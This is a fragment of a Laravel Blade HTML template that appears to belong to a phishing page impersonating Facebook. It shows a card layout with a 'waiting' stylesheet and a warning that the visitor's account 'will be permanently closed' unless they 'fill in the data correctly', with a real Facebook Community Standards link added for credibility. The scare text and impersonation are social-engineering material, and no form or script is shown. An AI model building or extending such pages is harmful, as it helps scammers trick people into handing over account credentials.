...
@section('content')
    <link rel="stylesheet" href="{{ url('css/waiting.css?version=12321') }}">
    ...
    <section id="fac" style="display: block;">
        <div class="justify-content-center g-0">
            <div>
                <div class="card">
                    <div class="bodyyy" style="max-width: 800px;margin: auto">
                        <div class="row g-0">
                            <div class="col-md-3" style="text-align: center"><img src="{{ url('images/outro.png') }}"
                                    alt="" style="width: 130px;"></div>
                            <div class="col-md-9">
                            ...
                            <hr />
                            <div class="col-md-12 AlertContent">
                                <svg width="17" height="14" viewBox="0 0 30 20" fill="none"
                                    style="margin-top: -5px" xmlns="http://www.w3.org/2000/svg">
                                ...
                                Please make sure to fill in the data correctly, if you fill in the wrong data your
                                account will be
                                permanently closed. To learn more about why we deactivate accounts, go to <a target="_blank"
                                    rel="noopener" href="https://facebook.com/communitystandards/">Community Standards</a>.
                            </div>
                        </div>
                    </div>
                </div>
